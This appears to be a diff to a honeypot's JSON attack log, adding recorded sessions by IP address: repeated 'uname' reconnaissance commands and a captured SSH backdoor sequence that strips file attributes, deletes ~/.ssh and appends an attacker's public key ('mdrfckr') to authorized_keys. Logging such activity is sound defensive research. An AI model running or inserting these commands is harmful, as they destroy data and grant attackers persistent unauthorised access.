@@ -371,6 +371,36 @@
             "session": "712da7e46e98"
         },
         {
+            "timestamp": "2023-11-15T16:12:21.340421Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "082e5da53d88"
+        },
+        {
+            "timestamp": "2023-11-15T16:22:54.267217Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "abc74e9fe00f"
+        },
+        {
+            "timestamp": "2023-11-15T16:28:09.406976Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "066538135844"
+        },
+        {
+            "timestamp": "2023-11-15T16:33:30.682981Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "0813b784d18b"
+        },
+        {
+            "timestamp": "2023-11-15T16:38:48.346915Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "675a80ca0671"
+        },
+        {
             "timestamp": "2023-11-14T01:11:15.024164Z",
             "event": "command_input",
             "input": "uname -s -v -n -r -m",
@@ -32151,6 +32181,26 @@
             "event": "file_download",
             "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
             "session": "b2f7607dcf6c"
+        }
+    ],
+    "117.102.64.108": [
+        {
+            "timestamp": "2023-11-15T17:09:40.297429Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "ff8103c56506"
+        },
+        {
+            "timestamp": "2023-11-15T17:09:41.084371Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "ff8103c56506"
+        },
+        {
+            "timestamp": "2023-11-15T17:09:41.303872Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "ff8103c56506"
         }
     ],
     "189.112.0.11": [
